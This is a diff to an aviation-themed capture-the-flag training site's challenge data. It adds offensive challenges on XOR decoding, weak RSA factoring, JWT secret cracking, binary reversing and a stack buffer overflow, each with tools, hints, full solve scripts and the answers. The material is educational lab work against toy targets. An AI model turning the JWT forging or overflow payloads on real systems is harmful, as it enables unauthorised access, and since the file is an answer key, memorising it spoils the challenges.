@@ -6,7 +6,8 @@ window.CATEGORIES = [
   { id: "logs",      name: "Logs",       blurb: "grep, awk, sort, uniq, jq: the daily grind of a SOC analyst." },
   { id: "avionics",  name: "Aviation",   blurb: "ADS-B, transponders, ACARS and GNSS: the aviation-specific data." },
   { id: "forensics", name: "Forensics",  blurb: "Metadata, hidden data, password cracking." },
-  { id: "hunt",      name: "Hunt / RE",  blurb: "Malware triage, YARA, reverse engineering and persistence hunting." }
+  { id: "hunt",      name: "Hunt / RE",  blurb: "Malware triage, YARA, reverse engineering and persistence hunting." },
+  { id: "offensive", name: "Offensive",  blurb: "Break it: classic crypto, web tokens, reverse engineering and binary exploitation." }
 ];
 
 window.CHALLENGES = [
@@ -309,5 +310,75 @@ window.CHALLENGES = [
   learn:"Linux persistence lives in a handful of well-known spots: cron (/etc/crontab, /etc/cron.d, hidden .files), systemd units (ExecStart running a shell/reverse shell), extra UID-0 accounts in /etc/passwd, and rogue keys in ~/.ssh/authorized_keys. Triage = check each spot. The flag's three parts hide in a cron base64 blob (part1), a systemd 'build-id' hex string (part2), and an SSH key comment (part3).",
   hints:["Extract, then look at etc/cron.d (including dotfiles), etc/systemd/system, and home/*/.ssh/authorized_keys.","part1: base64-decode the echo in etc/cron.d/.sys-health. part2: hex-decode the build-id comment in the sync .service. part3: read the comment on the second authorized_keys line.","Concatenate AVIANS{ part1 + part2 + part3 }."],
   solve:"tar xzf metar-srv02_triage.tar.gz\ngrep -oE '[A-Za-z0-9+/=]{20,}' metar-srv02/etc/cron.d/.sys-health | base64 -d            # part1\nsed -n 's/# build-id.*: //p' metar-srv02/etc/systemd/system/dbus-org.freedesktop.sync.service | xxd -r -p   # part2\ngrep -o 'part3=.*' metar-srv02/home/flightops/.ssh/authorized_keys                     # part3\n# combine: AVIANS{hunt_cron_systemd_and_ssh_keys}"
+},
+{
+  id:"23-xor-atis", cat:"offensive", title:"Scrambled ATIS", diff:1, points:100,
+  files:["atis_intercept.bin","note.txt"],
+  story:"A VHF datalink broadcast was intercepted and saved raw. It is scrambled with a short repeating key — XOR, not real encryption.",
+  question:"Recover the plaintext and read the flag inside it.",
+  tools:[
+    {name:"CyberChef", why:"'XOR Brute Force' tries single-byte keys; 'XOR' with a key decodes once you know it.", cmd:"XOR Brute Force / XOR"},
+    {name:"xortool", why:"Guesses the key length and the most likely repeating key.", cmd:"xortool -c 20 atis_intercept.bin   (then xortool-xor -f file -s KEY)"},
+    {name:"Python", why:"Once you guess the key, decoding is one line.", cmd:"bytes(b^key[i%len(key)] for i,b in enumerate(data))"}
+  ],
+  learn:"XOR with a repeating key is reversible with the same key — it is obfuscation, not encryption. If you can guess any part of the plaintext (a 'crib' like 'ATIS' or 'AVIANS{'), XOR it against the ciphertext at that position to leak the key. The key here is a short word; xortool or a crib will find it fast.",
+  hints:["The plaintext is aviation radio text; it almost certainly starts with 'ATIS'. XOR that crib against the first bytes to recover the start of the key.","The key is a place you'd associate with Brussels airport, 8 letters, uppercase.","key = ZAVENTEM. Decode the whole file with it."],
+  solve:"python3 -c \"d=open('atis_intercept.bin','rb').read();k=b'ZAVENTEM';import sys;sys.stdout.buffer.write(bytes(b^k[i%len(k)] for i,b in enumerate(d)))\""
+},
+{
+  id:"24-weak-crew-pki", cat:"offensive", title:"Weak Crew PKI", diff:3, points:225,
+  files:["pubkey_and_cipher.txt"],
+  story:"The crew portal's 'secure token' service uses RSA, but someone generated the key badly: the two prime factors are far too close together.",
+  question:"Factor the modulus, decrypt the ciphertext, and read the flag.",
+  tools:[
+    {name:"RsaCtfTool", why:"Throws every known weak-RSA attack at a key, including Fermat for close primes.", cmd:"RsaCtfTool --publickey key.pem --uncipher c   (or --n N --e E)"},
+    {name:"Fermat factorisation", why:"When p and q are close, n factors almost instantly.", cmd:"start a=ceil(sqrt(n)); increase a until a²-n is a perfect square"},
+    {name:"factordb", why:"Many small/weak moduli are already factored in the public database.", cmd:"http://factordb.com/  (paste n)"}
+  ],
+  learn:"RSA security relies on n = p×q being hard to factor. Two mistakes break that: primes that are too small, or primes that are too close. Close primes fall to Fermat factorisation (n ≈ a², so try a from √n upward until a²−n is a perfect square, giving p=a−b, q=a+b). Then d = e⁻¹ mod (p−1)(q−1) and m = cᵈ mod n.",
+  hints:["The hint is in the story: the primes are CLOSE. That is the Fermat case.","RsaCtfTool --n <N> --e <E> --uncipher <C> does it in one go.","Or implement Fermat: a=isqrt(n)+1; while a*a-n isn't a perfect square: a+=1."],
+  solve:"python3 -c \"import re;from math import isqrt;d=open('pubkey_and_cipher.txt').read();g=lambda k:int(re.search(k+r' = (\\d+)',d)[1]);n,e,c=g('n'),g('e'),g('c');a=isqrt(n)+1\nwhile True:\n b2=a*a-n;b=isqrt(b2)\n if b*b==b2:break\n a+=1\np,q=a-b,a+b;dd=pow(e,-1,(p-1)*(q-1));m=pow(c,dd,n);print(m.to_bytes((m.bit_length()+7)//8,'big').decode())\""
+},
+{
+  id:"25-crew-portal-jwt", cat:"offensive", title:"Crew Portal Token", diff:2, points:175,
+  files:["captured_token.txt"],
+  story:"A JSON Web Token was captured from the crew portal's 'remember me' cookie. It is signed with HS256, and the server reuses a weak secret.",
+  question:"Crack the signing secret. Submit it as AVIANS{secret}.",
+  tools:[
+    {name:"jwt_tool", why:"Inspects, cracks and forges JWTs.", cmd:"jwt_tool TOKEN -C -d aviation_wordlist.txt"},
+    {name:"hashcat", why:"Mode 16500 cracks HS256 JWTs against a wordlist.", cmd:"hashcat -m 16500 token.txt aviation_wordlist.txt"},
+    {name:"jwt.io", why:"Paste the token to read its header and payload (don't paste secrets anywhere online).", cmd:"base64 -d each of the first two dot-separated parts"}
+  ],
+  learn:"A JWT is header.payload.signature, each Base64URL. With HS256 the signature is HMAC-SHA256(secret, header.payload). If the secret is weak you can brute-force it offline, then forge any token you like (e.g. change \"role\":\"viewer\" to \"admin\"). Defence: long random secrets, and reject 'alg':'none'.",
+  hints:["Decode the first two parts to see the payload (role: viewer). The prize is the secret that signs it.","Crack with the shared aviation wordlist: jwt_tool TOKEN -C -d challenges/_shared/aviation_wordlist.txt","The secret is a single aviation word plus a year."],
+  solve:"jwt_tool \"$(tail -1 captured_token.txt)\" -C -d challenges/_shared/aviation_wordlist.txt\n# secret = jetstream2026  -> once cracked you could forge role:admin"
+},
+{
+  id:"26-hangar-keypad", cat:"offensive", title:"Hangar Keypad", diff:2, points:200,
+  files:["keypad","README.txt"],
+  story:"A door-keypad controller binary from hangar 3. Enter the right access code and it reveals a flag — but the flag is obfuscated, so 'strings' won't hand it to you.",
+  question:"Reverse the binary, find the access code, run it, and read the flag.",
+  tools:[
+    {name:"Ghidra", why:"Free decompiler: turns the binary back into readable C.", cmd:"ghidra  (import, analyse, look at check())"},
+    {name:"radare2 / rizin", why:"CLI reverse engineering; disassemble and inspect.", cmd:"r2 -A keypad; then 'pdf @ sym.check'"},
+    {name:"file / checksec / ltrace", why:"Identify it first, then watch what it compares.", cmd:"file keypad; ltrace ./keypad"}
+  ],
+  learn:"Static RE is reading a program without running it (or alongside running it). The check here transforms your input byte-by-byte (XOR with a constant) and compares against a table, so the password isn't a visible string — you recover it by reversing the transform. The flag is stored XOR'd and only de-obfuscated at runtime when the code path for 'correct' executes. chmod +x the file first.",
+  hints:["chmod +x keypad && file keypad. It reads a line and calls a check() function.","In the decompiler, check() does (input[i] ^ 0x2B) == table[i]. So input[i] = table[i] ^ 0x2B. Recover each character.","The code is CamelCase with a 3-digit aircraft number on the end. Enter it to print the flag."],
+  solve:"chmod +x keypad\n# From check(): password[i] = const_table[i] ^ 0x2B  ->  OpenSesame172\necho 'OpenSesame172' | ./keypad"
+},
+{
+  id:"27-jetway-overflow", cat:"offensive", title:"Jetway Overflow", diff:3, points:250,
+  files:["jetway","README.txt"],
+  story:"A jetway docking controller reads an aircraft name into a 64-byte buffer with gets() — no bounds check. There is a win() function that is never called.",
+  question:"Overflow the buffer to redirect execution to win(), which prints the flag. 64-bit, no PIE, no stack canary.",
+  tools:[
+    {name:"pwntools", why:"The standard Python exploit-dev toolkit: build the payload and talk to the process.", cmd:"from pwn import *; e=ELF('./jetway'); p=process('./jetway')"},
+    {name:"checksec", why:"Confirm the mitigations (here: no canary, no PIE) that make this straightforward.", cmd:"checksec --file=./jetway"},
+    {name:"gdb / pwndbg", why:"Find the exact offset from the buffer to the saved return address.", cmd:"pwndbg; cyclic 200; run; look at $rsp; cyclic -l <value>"}
+  ],
+  learn:"A stack buffer overflow overwrites the saved return address, so when the function returns the CPU jumps where you point it. Classic steps: (1) find the offset from your input to the return address (cyclic pattern), (2) get the address of win() (no PIE means it's fixed: nm/objdump), (3) send offset bytes of padding + that address (little-endian, 64-bit). Here the offset is 72. Defence: stack canaries, ASLR/PIE, and never gets().",
+  hints:["chmod +x jetway; checksec --file=./jetway (no canary, no PIE — so just overwrite the return address).","Get win()'s address: nm jetway | grep win   (it's fixed because PIE is off).","Offset is 72 bytes, then the 8-byte little-endian address of win()."],
+  solve:"chmod +x jetway\npython3 -c \"import subprocess;a=int([l.split()[0] for l in subprocess.run(['nm','jetway'],capture_output=True,text=True).stdout.splitlines() if l.endswith(' T win')][0],16);open('p','wb').write(b'A'*72+a.to_bytes(8,'little'))\"\n./jetway < p\n# or with pwntools: p.sendline(b'A'*72 + p64(e.symbols['win']))"
 }
 ];
